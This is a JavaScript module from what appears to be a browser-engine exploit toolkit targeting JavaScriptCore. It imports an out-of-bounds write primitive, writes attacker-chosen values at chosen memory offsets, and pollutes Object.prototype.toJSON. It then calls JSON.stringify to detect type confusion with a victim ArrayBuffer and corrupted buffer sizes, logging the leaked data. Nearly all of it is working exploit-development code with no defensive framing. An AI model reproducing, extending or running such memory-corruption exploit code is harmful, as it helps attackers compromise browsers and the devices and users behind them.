// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Contador global, usado apenas pela função de execução para log externo.
export let current_toJSON_call_count_for_TypeError_test = 0; 
let victim_ab_ref_for_tc_test = null; // Referência global para o victim_ab

// toJSON "segura" para inspecionar 'this' e tentar detectar Type Confusion
function toJSON_InspectThisForTC() {
    current_toJSON_call_count_for_TypeError_test++; // Incrementa para rastrear chamadas
    const FNAME_toJSON_local = `toJSON_InspectThisForTC(Call ${current_toJSON_call_count_for_TypeError_test})`;
    
    // Usar console.log para debug MUITO inicial dentro da toJSON, pois debug_log/logS3 podem ser o problema.
    // console.log(`[CONSOLE_toJSON] ${FNAME_toJSON_local} INVOCADA. this type: ${Object.prototype.toString.call(this)}`);
    // document.title pode causar TypeError, então vamos evitar aqui por enquanto.

    let inspection_results = {
        toJSON_executed: "toJSON_InspectThisForTC",
        call_number: current_toJSON_call_count_for_TypeError_test,
        this_actual_type: Object.prototype.toString.call(this),
        this_constructor_name: this?.constructor?.name || "N/A",
        is_victim_ab_ref: (victim_ab_ref_for_tc_test && this === victim_ab_ref_for_tc_test) ? "SIM" : "NÃO",
        is_instanceof_ArrayBuffer: (this instanceof ArrayBuffer) ? "SIM" : "NÃO",
        observed_byteLength: "N/A",
        dataView_read_at_0: "N/A (não tentado ou não aplicável)",
        error_during_inspection: null
    };

    try {
        if (this instanceof ArrayBuffer) {
            inspection_results.observed_byteLength = this.byteLength;
            if (this.byteLength >= 4) {
                try {
                    let dv = new DataView(this, 0, 4);
                    inspection_results.dataView_read_at_0 = toHex(dv.getUint32(0, true));
                } catch (e_dv) {
                    inspection_results.dataView_read_at_0 = `Erro DataView: ${e_dv.name}`;
                }
            } else {
                inspection_results.dataView_read_at_0 = "Buffer muito pequeno para DWORD";
            }
        }
    } catch (e_inspect) {
        inspection_results.error_during_inspection = `${e_inspect.name}: ${e_inspect.message}`;
    }
    
    // É crucial retornar um objeto simples para evitar recursão infinita ou TypeErrors pelo valor de retorno.
    return inspection_results; 
}

export async function executeAttemptThisConfusionWithValue(
    testDescription,
    valueToWriteOOB,     // O valor OOB a ser escrito
    corruptionOffsetToTest // O offset da corrupção
) {
    const FNAME = `executeAttemptThisConfusion<${testDescription}>`;
    logS3(`--- Iniciando Teste de Type Confusion (this): ${testDescription} ---`, "test", FNAME);
    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
    document.title = `Iniciando TC_this: ${testDescription}`;

    current_toJSON_call_count_for_TypeError_test = 0;
    victim_ab_ref_for_tc_test = null; // Limpa a referência global

    const victim_ab_size_val = 64;
    const bytes_to_write_val = 4;
    const ppKey_val = 'toJSON';

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME);
        document.title = "ERRO OOB Setup - " + FNAME;
        return { errorOccurred: new Error("OOB Setup Failed"), calls: 0, potentiallyCrashed: false, stringifyResult: null };
    }
    document.title = "OOB OK - " + FNAME;

    victim_ab_ref_for_tc_test = new ArrayBuffer(victim_ab_size_val); // Define a referência global
    logS3(`ArrayBuffer de referência (victim_ab_ref_for_tc_test, ${victim_ab_size_val}b) criado.`, "info", FNAME);
    
    let simple_obj_to_stringify = { message: "Eu sou um objeto simples sendo stringificado." };
    logS3(`Objeto a ser stringificado: ${JSON.stringify(simple_obj_to_stringify)}`, "info", FNAME);


    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let stepReached = "antes_pp";
    let potentiallyCrashed = true; 
    let errorCaptured = null;
    let stringifyResult = null;

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${ppKey_val} com toJSON_InspectThisForTC...`, "info", FNAME);
        document.title = `Aplicando PP TC (${testDescription})`;
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_InspectThisForTC,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada com toJSON_InspectThisForTC.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = `PP TC OK (${testDescription})`;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
        document.title = `Antes OOB Write TC (${toHex(corruptionOffsetToTest)})`;
        oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = `Após OOB Write TC (${toHex(corruptionOffsetToTest)})`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify_simple_obj";
        document.title = `Antes Stringify simple_obj (${toHex(corruptionOffsetToTest)})`;
        logS3(`Chamando JSON.stringify(simple_obj_to_stringify)... (Esperando que toJSON_InspectThisForTC seja chamada)`, "info", FNAME);
        
        try {
            // A VÍTIMA DO STRINGIFY É O OBJETO SIMPLES
            stringifyResult = JSON.stringify(simple_obj_to_stringify); 
            stepReached = `apos_stringify_simple_obj`;
            potentiallyCrashed = false; 
            document.title = `Strfy simple_obj OK (${testDescription})`;
            // Logar o resultado completo, pois ele contém os dados da inspeção do 'this'
            logS3(`Resultado JSON.stringify(simple_obj): ${JSON.stringify(stringifyResult)}`, "leak", FNAME); 
            logS3(`   (Chamadas totais à toJSON: ${current_toJSON_call_count_for_TypeError_test})`, "info", FNAME);
        } catch (e) {
            stepReached = `erro_stringify_simple_obj`;
            potentiallyCrashed = false; 
            errorCaptured = e;
            document.title = `ERRO Strfy simple_obj (${e.name}) - ${testDescription}`;
            logS3(`ERRO CAPTURADO JSON.stringify(simple_obj): ${e.name} - ${e.message}. (Chamadas: ${current_toJSON_call_count_for_TypeError_test})`, "critical", FNAME);
            if (e.stack) logS3(`   Stack: ${e.stack}`, "error");
            console.error(`JSON.stringify ERROR (simple_obj - ${testDescription}):`, e);
        }
    } catch (mainError) {
        potentiallyCrashed = false;
        errorCaptured = mainError;
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal TC - " + FNAME;
        if (mainError.stack) logS3(`   Stack: ${mainError.stack}`, "error");
        console.error("Main test error (TC this):", mainError);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
        victim_ab_ref_for_tc_test = null; // Limpa referência
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${current_toJSON_call_count_for_TypeError_test}.`, "info", FNAME);
        if (potentiallyCrashed) {
             document.title = `CONGELOU TC? ${stepReached} - ${FNAME}`;
             logS3(`O TESTE PODE TER CONGELADO/CRASHADO (TC this) em ${stepReached}. Chamadas: ${current_toJSON_call_count_for_TypeError_test}`, "error", FNAME);
        }
    }
    logS3(`--- Teste de Type Confusion (this) Concluído: ${testDescription} (Chamadas: ${current_toJSON_call_count_for_TypeError_test}) ---`, "test", FNAME);
    
    // Analisar o resultado da stringificação para checar a Type Confusion
    let tcDetected = false;
    if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_InspectThisForTC") {
        logS3("   Análise do resultado da toJSON_InspectThisForTC:", "info", FNAME);
        logS3(`     this_actual_type: ${stringifyResult.this_actual_type}`, "info", FNAME);
        logS3(`     is_victim_ab_ref: ${stringifyResult.is_victim_ab_ref}`, stringifyResult.is_victim_ab_ref === "SIM" ? "vuln" : "info", FNAME);
        logS3(`     is_instanceof_ArrayBuffer: ${stringifyResult.is_instanceof_ArrayBuffer}`, "info", FNAME);
        logS3(`     observed_byteLength: ${stringifyResult.observed_byteLength}`, "leak", FNAME);
        logS3(`     dataView_read_at_0: ${stringifyResult.dataView_read_at_0}`, "leak", FNAME);
        if (stringifyResult.error_during_inspection) {
            logS3(`     ERROR_IN_toJSON: ${stringifyResult.error_during_inspection}`, "error", FNAME);
        }
        if (stringifyResult.is_victim_ab_ref === "SIM" || (stringifyResult.is_instanceof_ArrayBuffer === "SIM" && stringifyResult.this_actual_type === "[object ArrayBuffer]" && stringifyResult.this_constructor_name === "ArrayBuffer")) {
            tcDetected = true;
            logS3("     !!!! TYPE CONFUSION POTENCIALMENTE DETECTADA !!!! 'this' na toJSON parece ser o victim_ab_ref_for_tc_test!", "critical", FNAME);
            document.title = `TC DETECTADA! - ${testDescription}`;
            if (typeof stringifyResult.observed_byteLength === 'number' && stringifyResult.observed_byteLength !== victim_ab_size_val) {
                logS3(`     !!!! TAMANHO ANÔMALO DO VICTIM_AB (this): ${stringifyResult.observed_byteLength} (esperado ${victim_ab_size_val}) !!!!`, "critical", FNAME);
                document.title = `TC + SIZE CORRUPT! ${stringifyResult.observed_byteLength} - ${testDescription}`;
            }
        }
    }

    if (!potentiallyCrashed && !errorCaptured && !document.title.startsWith("TC DETECTADA") && !document.title.startsWith("TC + SIZE")) {
        document.title = `Teste TC_this OK (${tcDetected ? "TC!" : "No TC"}) - ${testDescription}`;
    } else if (errorCaptured && !document.title.startsWith("ERRO Strfy")) { 
        document.title = `ERRO OCORREU TC (${errorCaptured.name}) - ${testDescription}`;
    }
    
    return { errorOccurred: errorCaptured, calls: current_toJSON_call_count_for_TypeError_test, potentiallyCrashed, stringifyResult, tcDetected };
}
